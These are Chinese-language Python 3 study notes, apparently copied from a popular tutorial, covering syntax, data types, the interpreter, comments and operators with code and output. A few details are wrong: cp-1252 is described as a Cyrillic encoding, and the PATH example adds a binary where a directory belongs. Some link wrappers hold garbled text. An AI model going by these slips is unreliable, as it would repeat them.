# 一，Python3基础

## 1，Python3 基础语法

### 1-1 编码

默认情况下，Python 3 源码文件以 **UTF-8** 编码，所有字符串都是 unicode 字符串。 当然你也可以为源码文件指定不同的编码：

```python
# -*- coding: cp-1252 -*-
```

上述定义允许在源文件中使用 Windows-1252 字符集中的字符编码，对应适合语言为保加利亚语、白罗斯语、马其顿语、俄语、塞尔维亚语。

------

### 1-2 标识符

- 第一个字符必须是字母表中字母或下划线 **_** 。
- 标识符的其他的部分由字母、数字和下划线组成。
- 标识符对大小写敏感。

在 Python 3 中，可以用中文作为变量名，非 ASCII 标识符也是允许的了。

------

### 1-3 python保留字

保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：

```python
>>> import keyword
>>> keyword.kwlist
['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']
```

------

### 1-4 注释

Python中单行注释以 **#** 开头，实例如下

```python
#!/usr/bin/python3
 
# 第一个注释
print ("Hello, Python!") # 第二个注释
```

执行以上代码，输出结果为：

```
Hello, Python!
```

多行注释可以用多个 **#** 号，还有 **'''** 和 **"""**：

```python
#!/usr/bin/python3
 
# 第一个注释
# 第二个注释
 
'''
第三注释
第四注释
'''
 
"""
第五注释
第六注释
"""
print ("Hello, Python!")
```

执行以上代码，输出结果为：

```
Hello, Python!
```

### 1-5 行与缩进

python最具特色的就是使用缩进来表示代码块，不需要使用大括号 **{}** 。

缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。实例如下

```python
if True:
    print ("True")
else:
    print ("False")
```

以下代码最后一行语句缩进数的空格数不一致，会导致运行错误：

```python
if True:
    print ("Answer")
    print ("True")
else:
    print ("Answer")
  print ("False")    # 缩进不一致，会导致运行错误
```

以上程序由于缩进不一致，执行后会出现类似以下错误：

```python
 File "test.py", line 6
    print ("False")    # 缩进不一致，会导致运行错误
                                      ^
IndentationError: unindent does not match any outer indentation level
```

### 1-6 多行语句

Python 通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠(\)来实现多行语句，例如：

```python
total = item_one + \
        item_two + \
        item_three
```

在 [], {}, 或 () 中的多行语句，不需要使用反斜杠(\)，例如：

```python
total = ['item_one', 'item_two', 'item_three',
        'item_four', 'item_five']
```

------

### 1-7 数字(Number)类型

python中数字有四种类型：整数、布尔型、浮点数和复数。

- **int** (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。
- **bool** (布尔), 如 True。
- **float** (浮点数), 如 1.23、3E-2
- **complex** (复数), 如 1 + 2j、 1.1 + 2.2j

------

### 1-8 字符串(String)

- python中单引号和双引号使用完全相同。
- 使用三引号('''或""")可以指定一个多行字符串。
- 转义符 '\'
- 反斜杠可以用来转义，使用r可以让反斜杠不发生转义。。 如 r"this is a line with \n" 则\n会显示，并不是换行。
- 按字面意义级联字符串，如"this " "is " "string"会被自动转换为this is string。
- 字符串可以用 + 运算符连接在一起，用 * 运算符重复。
- Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。
- Python中的字符串不能改变。
- Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。
- 字符串的截取的语法格式如下：**变量[头下标:尾下标:步长]**

```Python
word = '字符串'
sentence = "这是一个句子。"
paragraph = """这是一个段落，
可以由多行组成"""
```

```python
#!/usr/bin/python3
 
str='Runoob'
 
print(str)                 # 输出字符串
print(str[0:-1])           # 输出第一个到倒数第二个的所有字符
print(str[0])              # 输出字符串第一个字符
print(str[2:5])            # 输出从第三个开始到第五个的字符
print(str[2:])             # 输出从第三个开始后的所有字符
print(str * 2)             # 输出字符串两次
print(str + '你好')        # 连接字符串
 
print('------------------------------')
 
print('hello\nrunoob')      # 使用反斜杠(\)+n转义特殊字符
print(r'hello\nrunoob')     # 在字符串前面添加一个 r，表示原始字符串，不会发生转义
```

这里的 r 指 raw，即 raw string。

输出结果为：

```
Runoob
Runoo
R
noo
noob
RunoobRunoob
Runoob你好
------------------------------
hello
runoob
hello\nrunoob
```

------

### 1-9 空行

函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。

空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。

**记住：**空行也是程序代码的一部分。

------

### 1-10 等待用户输入

执行下面的程序在按回车键后就会等待用户输入：

```python
#!/usr/bin/python3
 
input("\n\n按下 enter 键后退出。")
```

以上代码中 ，"\n\n"在结果输出前会输出两个新的空行。一旦用户按下 enter 键时，程序将退出。

------

### 1-11 同一行显示多条语句

Python可以在同一行中使用多条语句，语句之间使用分号(;)分割，以下是一个简单的实例：

```Python
#!/usr/bin/python3
 
import sys; x = 'runoob'; sys.stdout.write(x + '\n')
```

使用脚本执行以上代码，输出结果为：

```
runoob
```

使用交互式命令行执行，输出结果为：

```
>>> import sys; x = 'runoob'; sys.stdout.write(x + '\n')
runoob
7
```

此处的 7 表示字符数。

------

### 1-12 多个语句构成代码组

缩进相同的一组语句构成一个代码块，我们称之代码组。

像if、while、def和class这样的复合语句，首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组。

我们将首行及后面的代码组称为一个子句(clause)。

如下实例：

```python
if expression : 
   suite
elif expression : 
   suite 
else : 
   suite
```

### 1-13 Print 输出

print 默认输出是换行的，如果要实现不换行需要在变量末尾加上 **end=""**：

```python
#!/usr/bin/python3
 
x="a"
y="b"
# 换行输出
print( x )
print( y )
 
print('---------')
# 不换行输出
print( x, end=" " )
print( y, end=" " )
print()
```

以上实例执行结果为：

```
a
b
---------
a b
```

------

### 1-14 import 与 from...import

- 在 python 用 **import** 或者 **from...import** 来导入相应的模块。
- 将整个模块(somemodule)导入，格式为： **import somemodule**
- 从某个模块中导入某个函数,格式为： **from somemodule import somefunction**
- 从某个模块中导入多个函数,格式为： **from somemodule import firstfunc, secondfunc, thirdfunc**
- 将某个模块中的全部函数导入，格式为： **from somemodule import \***

```python
# 导入 sys 模块
import sys
print('================Python import mode==========================')
print ('命令行参数为:')
for i in sys.argv:
    print (i)
print ('\n python 路径为',sys.path)

```

```Python
# 导入 sys 模块的 argv,path 成员
from sys import argv,path  #  导入特定的成员
 
print('================python from import===================================')
print('path:',path) # 因为已经导入path成员，所以此处引用时不需要加sys.path
```

### 1-15 命令行参数

很多程序可以执行一些操作来查看一些基本信息，Python可以使用-h参数查看各参数帮助信息：

```python
$ python -h
usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Options and arguments (and corresponding environment variables):
-c cmd : program passed in as string (terminates option list)
-d     : debug output from parser (also PYTHONDEBUG=x)
-E     : ignore environment variables (such as PYTHONPATH)
-h     : print this help message and exit

[ etc. ]
```

我们在使用脚本形式执行 Python 时，可以接收命令行输入的参数，具体使用可以参照 [Python 3 命令行参数](javascript:if(confirm('https://www.runoob.com/python3/dml.html  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ������, �����������, ����Ŀ����ֹͣ��  \n\n�����ڷ������ϴ���?'))window.location='https://www.runoob.com/python3/dml.html')。

## 2，Python3 基本数据类型

- Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。
- 在 Python 中，变量就是变量，它没有类型，我们所说的"类型"是变量所指的内存中对象的类型。
- 等号（=）用来给变量赋值。
- 等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。例如：

```python
#!/usr/bin/python3
 
counter = 100          # 整型变量
miles   = 1000.0       # 浮点型变量
name    = "runoob"     # 字符串
 
print (counter)
print (miles)
print (name)
```

执行以上程序会输出如下结果：

```
100
1000.0
runoob
```

### 2-1 多个变量赋值

Python允许你同时为多个变量赋值。例如：

```Python
a = b = c = 1
```

以上实例，创建一个整型对象，值为 1，从后向前赋值，三个变量被赋予相同的数值。

您也可以为多个对象指定多个变量。例如：

```python
a, b, c = 1, 2, "runoob"
```

以上实例，两个整型对象 1 和 2 的分配给变量 a 和 b，字符串对象 "runoob" 分配给变量 c。

------

### 2-2 标准数据类型

Python3 中有六个标准的数据类型：

- Number（数字）
- String（字符串）
- List（列表）
- Tuple（元组）
- Set（集合）
- Dictionary（字典）

Python3 的六个标准数据类型中：

- **不可变数据（3 个）：**Number（数字）、String（字符串）、Tuple（元组）；
- **可变数据（3 个）：**List（列表）、Dictionary（字典）、Set（集合）。

------

### 2-3 Number（数字）

Python3 支持 **int、float、bool、complex（复数）**。

在Python 3里，只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。

像大多数语言一样，数值类型的赋值和计算都是很直观的。

内置的 type() 函数可以用来查询变量所指的对象类型。

```
>>> a, b, c, d = 20, 5.5, True, 4+3j
>>> print(type(a), type(b), type(c), type(d))
<class 'int'> <class 'float'> <class 'bool'> <class 'complex'>
```

此外还可以用 isinstance 来判断：

```python
>>>a = 111
>>> isinstance(a, int)
True
>>>
```

isinstance 和 type 的区别在于：

- type()不会认为子类是一种父类类型。
- isinstance()会认为子类是一种父类类型。

```python
>>> class A:
...     pass
... 
>>> class B(A):
...     pass
... 
>>> isinstance(A(), A)
True
>>> type(A()) == A 
True
>>> isinstance(B(), A)
True
>>> type(B()) == A
False
```

> **注意：**在 Python2 中是没有布尔型的，它用数字 0 表示 False，用 1 表示 True。到 Python3 中，把 True 和 False 定义成关键字了，但它们的值还是 1 和 0，它们可以和数字相加。

当你指定一个值时，Number 对象就会被创建：

```python
var1 = 1
var2 = 10
```

您也可以使用del语句删除一些对象引用。

del语句的语法是：

```python
del var1[,var2[,var3[....,varN]]]
```

您可以通过使用del语句删除单个或多个对象。例如：

```python
del var
del var_a, var_b
```

### 2-4 数值运算

```python
>>>5 + 4  # 加法
9
>>> 4.3 - 2 # 减法
2.3
>>> 3 * 7  # 乘法
21
>>> 2 / 4  # 除法，得到一个浮点数
0.5
>>> 2 // 4 # 除法，得到一个整数
0
>>> 17 % 3 # 取余 
2
>>> 2 ** 5 # 乘方
32
```

**注意：**

- 1、Python可以同时为多个变量赋值，如a, b = 1, 2。
- 2、一个变量可以通过赋值指向不同类型的对象。
- 3、数值的除法包含两个运算符：**/** 返回一个浮点数，**//** 返回一个整数。
- 4、在混合计算时，Python会把整型转换成为浮点数。

### 2-5 数值类型实例

![image-20240229110827352](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229110827352.png)

### 2-6 String（字符串）

Python中的字符串用单引号 **'** 或双引号 **"** 括起来，同时使用反斜杠 **\** 转义特殊字符。

字符串的截取的语法格式如下：

```
变量[头下标:尾下标]
```

加号 **+** 是字符串的连接符， 星号 ***** 表示复制当前字符串，紧跟的数字为复制的次数。实例如下：

```python
#!/usr/bin/python3
 
str = 'Runoob'
 
print (str)          # 输出字符串
print (str[0:-1])    # 输出第一个到倒数第二个的所有字符
print (str[0])       # 输出字符串第一个字符
print (str[2:5])     # 输出从第三个开始到第五个的字符
print (str[2:])      # 输出从第三个开始的后的所有字符
print (str * 2)      # 输出字符串两次
print (str + "TEST") # 连接字符串
```

执行以上程序会输出如下结果：

```
Runoob
Runoo
R
noo
noob
RunoobRunoob
RunoobTEST
```

Python 使用反斜杠(\)转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串：

```
>>> print('Ru\noob')
Ru
oob
>>> print(r'Ru\noob')
Ru\noob
>>> 
```

另外，反斜杠(\)可以作为续行符，表示下一行是上一行的延续。也可以使用 **"""..."""** 或者 **'''...'''** 跨越多行。

注意，Python 没有单独的字符类型，一个字符就是长度为1的字符串。

```python
>>>word = 'Python'
>>> print(word[0], word[5])
P n
>>> print(word[-1], word[-6])
n P
```

与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如word[0] = 'm'会导致错误。

**注意：**

- 1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。
- 2、字符串可以用+运算符连接在一起，用*运算符重复。
- 3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。
- 4、Python中的字符串不能改变。

------

### 2-7 List（列表）

- List（列表） 是 Python 中使用最频繁的数据类型。
- 列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。
- 列表是写在方括号 **[]** 之间、用逗号分隔开的元素列表。
- 和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。
- 列表截取的语法格式如下

加号 **+** 是列表连接运算符，星号 ***** 是重复操作。如下实例：

```python
#!/usr/bin/python3
 
list = [ 'abcd', 786 , 2.23, 'runoob', 70.2 ]
tinylist = [123, 'runoob']
 
print (list)            # 输出完整列表
print (list[0])         # 输出列表第一个元素
print (list[1:3])       # 从第二个开始输出到第三个元素
print (list[2:])        # 输出从第三个元素开始的所有元素
print (tinylist * 2)    # 输出两次列表
print (list + tinylist) # 连接列表
```

以上实例输出结果：

```
['abcd', 786, 2.23, 'runoob', 70.2]
abcd
[786, 2.23]
[2.23, 'runoob', 70.2]
[123, 'runoob', 123, 'runoob']
['abcd', 786, 2.23, 'runoob', 70.2, 123, 'runoob']
```

与Python字符串不一样的是，列表中的元素是可以改变的：

```python
>>>a = [1, 2, 3, 4, 5, 6]
>>> a[0] = 9
>>> a[2:5] = [13, 14, 15]
>>> a
[9, 2, 13, 14, 15, 6]
>>> a[2:5] = []   # 将对应的元素值设置为 [] 
>>> a
[9, 2, 6]
```

List 内置了有很多方法，例如 append()、pop() 等等，这在后面会讲到。

**注意：**

- 1、List写在方括号之间，元素用逗号隔开。
- 2、和字符串一样，list可以被索引和切片。
- 3、List可以使用+操作符进行拼接。
- 4、List中的元素是可以改变的。

Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：

如果第三个参数为负数表示逆向读取，以下实例用于翻转字符串：

```python
def reverseWords(input):
     
    # 通过空格将字符串分隔符，把各个单词分隔为列表
    inputWords = input.split(" ")
 
    # 翻转字符串
    # 假设列表 list = [1,2,3,4],  
    # list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样)
    # inputWords[-1::-1] 有三个参数
    # 第一个参数 -1 表示最后一个元素
    # 第二个参数为空，表示移动到列表末尾
    # 第三个参数为步长，-1 表示逆向
    inputWords=inputWords[-1::-1]
 
    # 重新组合字符串
    output = ' '.join(inputWords)
     
    return output
 
if __name__ == "__main__":
    input = 'I like runoob'
    rw = reverseWords(input)
    print(rw)
```

输出结果为：

```
runoob like I
```

------

### 2-8 Tuple（元组）

元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 **()** 里，元素之间用逗号隔开。

元组中的元素类型也可以不相同：

```python
#!/usr/bin/python3
 
tuple = ( 'abcd', 786 , 2.23, 'runoob', 70.2  )
tinytuple = (123, 'runoob')
 
print (tuple)             # 输出完整元组
print (tuple[0])          # 输出元组的第一个元素
print (tuple[1:3])        # 输出从第二个元素开始到第三个元素
print (tuple[2:])         # 输出从第三个元素开始的所有元素
print (tinytuple * 2)     # 输出两次元组
print (tuple + tinytuple) # 连接元组
```

以上实例输出结果：

```
('abcd', 786, 2.23, 'runoob', 70.2)
abcd
(786, 2.23)
(2.23, 'runoob', 70.2)
(123, 'runoob', 123, 'runoob')
('abcd', 786, 2.23, 'runoob', 70.2, 123, 'runoob')
```

元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。

其实，可以把字符串看作一种特殊的元组。

```python
>>>tup = (1, 2, 3, 4, 5, 6)
>>> print(tup[0])
1
>>> print(tup[1:5])
(2, 3, 4, 5)
>>> tup[0] = 11  # 修改元组元素的操作是非法的
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: 'tuple' object does not support item assignment
>>>
```

虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。

构造包含 0 个或 1 个元素的元组比较特殊，所以有一些额外的语法规则：

```
tup1 = ()    # 空元组
tup2 = (20,) # 一个元素，需要在元素后添加逗号
```

string、list 和 tuple 都属于 sequence（序列）。

**注意：**

- 1、与字符串一样，元组的元素不能修改。
- 2、元组也可以被索引和切片，方法一样。
- 3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。
- 4、元组也可以使用+操作符进行拼接。

### 2-9 Set（集合）

集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。

基本功能是进行成员关系测试和删除重复元素。

可以使用大括号 **{ }** 或者 **set()** 函数创建集合，注意：创建一个空集合必须用 **set()** 而不是 **{ }**，因为 **{ }** 是用来创建一个空字典。

创建格式：

```python
parame = {value01,value02,...}
或者
set(value)
```

```python
#!/usr/bin/python3
 
student = {'Tom', 'Jim', 'Mary', 'Tom', 'Jack', 'Rose'}
 
print(student)   # 输出集合，重复的元素被自动去掉
 
# 成员测试
if 'Rose' in student :
    print('Rose 在集合中')
else :
    print('Rose 不在集合中')
 
 
# set可以进行集合运算
a = set('abracadabra')
b = set('alacazam')
 
print(a)
 
print(a - b)     # a 和 b 的差集
 
print(a | b)     # a 和 b 的并集
 
print(a & b)     # a 和 b 的交集
 
print(a ^ b)     # a 和 b 中不同时存在的元素
```

以上实例输出结果：

```
{'Mary', 'Jim', 'Rose', 'Jack', 'Tom'}
Rose 在集合中
{'b', 'a', 'c', 'r', 'd'}
{'b', 'd', 'r'}
{'l', 'r', 'a', 'c', 'z', 'm', 'b', 'd'}
{'a', 'c'}
{'l', 'r', 'z', 'm', 'b', 'd'}
```

### 2-10 Dictionary（字典）

- 字典（dictionary）是Python中另一个非常有用的内置数据类型。
- 列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。
- 字典是一种映射类型，字典用 **{ }** 标识，它是一个无序的 **键(key) : 值(value)** 的集合。
- 键(key)必须使用不可变类型。
- 在同一个字典中，键(key)必须是唯一的。

```python
#!/usr/bin/python3
 
dict = {}
dict['one'] = "1 - 菜鸟教程"
dict[2]     = "2 - 菜鸟工具"
 
tinydict = {'name': 'runoob','code':1, 'site': 'www.runoob.com'}
 
 
print (dict['one'])       # 输出键为 'one' 的值
print (dict[2])           # 输出键为 2 的值
print (tinydict)          # 输出完整的字典
print (tinydict.keys())   # 输出所有键
print (tinydict.values()) # 输出所有值
```

以上实例输出结果：

```
1 - 菜鸟教程
2 - 菜鸟工具
{'name': 'runoob', 'code': 1, 'site': 'www.runoob.com'}
dict_keys(['name', 'code', 'site'])
dict_values(['runoob', 1, 'www.runoob.com'])
```

构造函数 dict() 可以直接从键值对序列中构建字典如下：

```python
>>>dict([('Runoob', 1), ('Google', 2), ('Taobao', 3)])
{'Taobao': 3, 'Runoob': 1, 'Google': 2}
 
>>> {x: x**2 for x in (2, 4, 6)}
{2: 4, 4: 16, 6: 36}
 
>>> dict(Runoob=1, Google=2, Taobao=3)
{'Runoob': 1, 'Google': 2, 'Taobao': 3}
```

另外，字典类型也有一些内置的函数，例如clear()、keys()、values()等。

**注意：**

- 1、字典是一种映射类型，它的元素是键值对。
- 2、字典的关键字必须为不可变类型，且不能重复。
- 3、创建空字典使用 **{ }**。

------

### 2-11 Python数据类型转换

有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。

以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。

![image-20240229111334498](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229111334498.png)

## 3，Python3 解释器

Linux/Unix的系统上，一般默认的 python 版本为 2.x，我们可以将 python3.x 安装在 **/usr/local/python3** 目录中。

安装完成后，我们可以将路径 **/usr/local/python3/bin** 添加到您的 Linux/Unix 操作系统的环境变量中，这样您就可以通过 shell 终端输入下面的命令来启动 Python3 。

```shell
$ PATH=$PATH:/usr/local/python3/bin/python3    # 设置环境变量
$ python3 --version
Python 3.4.0
```

在Window系统下你可以通过以下命令来设置Python的环境变量，假设你的Python安装在 C:\Python34 下:

```shell
set path=%path%;C:\python34
```

### 3-1 交互式编程

我们可以在命令提示符中输入"Python"命令来启动Python解释器：

```shell
$ python3
```

执行以上命令后，出现如下窗口信息：

```shell
$ python3
Python 3.4.0 (default, Apr 11 2014, 13:05:11) 
[GCC 4.8.2] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```

在 python 提示符中输入以下语句，然后按回车键查看运行效果：

```shell
print ("Hello, Python!");
```

以上命令执行结果如下：

```shell
Hello, Python!
```

当键入一个多行结构时，续行是必须的。我们可以看下如下 if 语句：

```shell
>>> flag = True
>>> if flag :
...     print("flag 条件为 True!")
... 
flag 条件为 True!
```

### 3-2 脚本式编程

将如下代码拷贝至 **hello.py**文件中：

```Python
print ("Hello, Python!");
```

通过以下命令执行该脚本：

```Python
python3 hello.py
```

输出结果为：

```Python
Hello, Python!
```

在Linux/Unix系统中，你可以在脚本顶部添加以下命令让Python脚本可以像SHELL脚本一样可直接执行：

```Python
#! /usr/bin/env python3
```

然后修改脚本权限，使其有执行权限，命令如下：

```Python
$ chmod +x hello.py
```

执行以下命令：

```Python
./hello.py
```

输出结果为：

```Python
Hello, Python!
```

## 4，Python3 注释

确保对模块, 函数, 方法和行内注释使用正确的风格

Python中的注释有单行注释和多行注释：

Python中单行注释以 **#** 开头，例如：：

```python
# 这是一个注释
print("Hello, World!")
```

多行注释用三个单引号 **'''** 或者三个双引号 **"""** 将注释括起来，例如:

### 4-1 单引号（'''）

```python
#!/usr/bin/python3 
'''
这是多行注释，用三个单引号
这是多行注释，用三个单引号 
这是多行注释，用三个单引号
'''
print("Hello, World!")
```

### 4-2 双引号（"""）

```python
#!/usr/bin/python3 
"""
这是多行注释，用三个双引号
这是多行注释，用三个双引号 
这是多行注释，用三个双引号
"""
print("Hello, World!")
```

## 5，Python运算符

### 5-1 Python算术运算符

以下假设变量a为10，变量b为21：

![image-20240229111934676](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229111934676.png)

以下实例演示了Python所有算术运算符的操作：

```python
#!/usr/bin/python3
 
a = 21
b = 10
c = 0
 
c = a + b
print ("1 - c 的值为：", c)
 
c = a - b
print ("2 - c 的值为：", c)
 
c = a * b
print ("3 - c 的值为：", c)
 
c = a / b
print ("4 - c 的值为：", c)
 
c = a % b
print ("5 - c 的值为：", c)
 
# 修改变量 a 、b 、c
a = 2
b = 3
c = a**b 
print ("6 - c 的值为：", c)
 
a = 10
b = 5
c = a//b 
print ("7 - c 的值为：", c)
```

以上实例输出结果：

```
1 - c 的值为： 31
2 - c 的值为： 11
3 - c 的值为： 210
4 - c 的值为： 2.1
5 - c 的值为： 1
6 - c 的值为： 8
7 - c 的值为： 2
```

### 5-2 Python比较运算符

以下假设变量a为10，变量b为20：

![image-20240229112021749](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112021749.png)

以下实例演示了Python所有比较运算符的操作：

```python
#!/usr/bin/python3
 
a = 21
b = 10
c = 0
 
if ( a == b ):
   print ("1 - a 等于 b")
else:
   print ("1 - a 不等于 b")
 
if ( a != b ):
   print ("2 - a 不等于 b")
else:
   print ("2 - a 等于 b")
 
if ( a < b ):
   print ("3 - a 小于 b")
else:
   print ("3 - a 大于等于 b")
 
if ( a > b ):
   print ("4 - a 大于 b")
else:
   print ("4 - a 小于等于 b")
 
# 修改变量 a 和 b 的值
a = 5;
b = 20;
if ( a <= b ):
   print ("5 - a 小于等于 b")
else:
   print ("5 - a 大于  b")
 
if ( b >= a ):
   print ("6 - b 大于等于 a")
else:
   print ("6 - b 小于 a")
```

以上实例输出结果：

```
1 - a 不等于 b
2 - a 不等于 b
3 - a 大于等于 b
4 - a 大于 b
5 - a 小于等于 b
6 - b 大于等于 a
```

### 5-3 Python赋值运算符

以下假设变量a为10，变量b为20：

![image-20240229112111790](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112111790.png)

```python
#!/usr/bin/python3
 
a = 21
b = 10
c = 0
 
c = a + b
print ("1 - c 的值为：", c)
 
c += a
print ("2 - c 的值为：", c)
 
c *= a
print ("3 - c 的值为：", c)
 
c /= a 
print ("4 - c 的值为：", c)
 
c = 2
c %= a
print ("5 - c 的值为：", c)
 
c **= a
print ("6 - c 的值为：", c)
 
c //= a
print ("7 - c 的值为：", c)
```

以上实例输出结果：

```
1 - c 的值为： 31
2 - c 的值为： 52
3 - c 的值为： 1092
4 - c 的值为： 52.0
5 - c 的值为： 2
6 - c 的值为： 2097152
7 - c 的值为： 99864
```

### 5-4 Python位运算符

按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：

下表中变量 a 为 60，b 为 13二进制格式如下：

```
a = 0011 1100

b = 0000 1101

-----------------

a&b = 0000 1100

a|b = 0011 1101

a^b = 0011 0001

~a  = 1100 0011
```

![image-20240229112201606](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112201606.png)

```python
#!/usr/bin/python3
 
a = 60            # 60 = 0011 1100 
b = 13            # 13 = 0000 1101 
c = 0
 
c = a & b;        # 12 = 0000 1100
print ("1 - c 的值为：", c)
 
c = a | b;        # 61 = 0011 1101 
print ("2 - c 的值为：", c)
 
c = a ^ b;        # 49 = 0011 0001
print ("3 - c 的值为：", c)
 
c = ~a;           # -61 = 1100 0011
print ("4 - c 的值为：", c)
 
c = a << 2;       # 240 = 1111 0000
print ("5 - c 的值为：", c)
 
c = a >> 2;       # 15 = 0000 1111
print ("6 - c 的值为：", c)
```

以上实例输出结果：

```
1 - c 的值为： 12
2 - c 的值为： 61
3 - c 的值为： 49
4 - c 的值为： -61
5 - c 的值为： 240
6 - c 的值为： 15
```

### 5-5 Python逻辑运算符

Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:

![image-20240229112246185](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112246185.png)

```Python
#!/usr/bin/python3
 
a = 10
b = 20
 
if ( a and b ):
   print ("1 - 变量 a 和 b 都为 true")
else:
   print ("1 - 变量 a 和 b 有一个不为 true")
 
if ( a or b ):
   print ("2 - 变量 a 和 b 都为 true，或其中一个变量为 true")
else:
   print ("2 - 变量 a 和 b 都不为 true")
 
# 修改变量 a 的值
a = 0
if ( a and b ):
   print ("3 - 变量 a 和 b 都为 true")
else:
   print ("3 - 变量 a 和 b 有一个不为 true")
 
if ( a or b ):
   print ("4 - 变量 a 和 b 都为 true，或其中一个变量为 true")
else:
   print ("4 - 变量 a 和 b 都不为 true")
 
if not( a and b ):
   print ("5 - 变量 a 和 b 都为 false，或其中一个变量为 false")
else:
   print ("5 - 变量 a 和 b 都为 true")
```

以上实例输出结果：

```
1 - 变量 a 和 b 都为 true
2 - 变量 a 和 b 都为 true，或其中一个变量为 true
3 - 变量 a 和 b 有一个不为 true
4 - 变量 a 和 b 都为 true，或其中一个变量为 true
5 - 变量 a 和 b 都为 false，或其中一个变量为 false
```

### 5-6 Python成员运算符

除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。

![image-20240229112330822](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112330822.png)

```python
#!/usr/bin/python3
 
a = 10
b = 20
list = [1, 2, 3, 4, 5 ];
 
if ( a in list ):
   print ("1 - 变量 a 在给定的列表中 list 中")
else:
   print ("1 - 变量 a 不在给定的列表中 list 中")
 
if ( b not in list ):
   print ("2 - 变量 b 不在给定的列表中 list 中")
else:
   print ("2 - 变量 b 在给定的列表中 list 中")
 
# 修改变量 a 的值
a = 2
if ( a in list ):
   print ("3 - 变量 a 在给定的列表中 list 中")
else:
   print ("3 - 变量 a 不在给定的列表中 list 中")
```

以上实例输出结果：

```
1 - 变量 a 不在给定的列表中 list 中
2 - 变量 b 不在给定的列表中 list 中
3 - 变量 a 在给定的列表中 list 中
```

### 5-7 Python身份运算符

身份运算符用于比较两个对象的存储单元

![image-20240229112412063](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240229112412063.png)

**注：** [id()](javascript:if(confirm('https://www.runoob.com/python/extend.html  \n\n���ļ��޷��� Teleport Ultra ����, ��Ϊ ������, �����������, ����Ŀ����ֹͣ��  \n\n�����ڷ������ϴ���?'))window.location='https://www.runoob.com/python/extend.html') 函数用于获取对象内存地址。

以下实例演示了Python所有身份运算符的操作：

```Python
#!/usr/bin/python3
 
a = 20
b = 20
 
if ( a is b ):
   print ("1 - a 和 b 有相同的标识")
else:
   print ("1 - a 和 b 没有相同的标识")
 
if ( id(a) == id(b) ):
   print ("2 - a 和 b 有相同的标识")
else:
   print ("2 - a 和 b 没有相同的标识")
 
# 修改变量 b 的值
b = 30
if ( a is b ):
   print ("3 - a 和 b 有相同的标识")
else:
   print ("3 - a 和 b 没有相同的标识")
 
if ( a is not b ):
   print ("4 - a 和 b 没有相同的标识")
else:
   print ("4 - a 和 b 有相同的标识")
```

以上实例输出结果：

```
1 - a 和 b 有相同的标识
2 - a 和 b 有相同的标识
3 - a 和 b 没有相同的标识
4 - a 和 b 没有相同的标识
```

**is 与 == 区别：**

**is 用于判断两个变量引用对象是否为同一个， == 用于判断引用变量的值是否相等。**

```python
>>>a = [1, 2, 3]
>>> b = a
>>> b is a 
True
>>> b == a
True
>>> b = a[:]
>>> b is a
False
>>> b == a
True
```

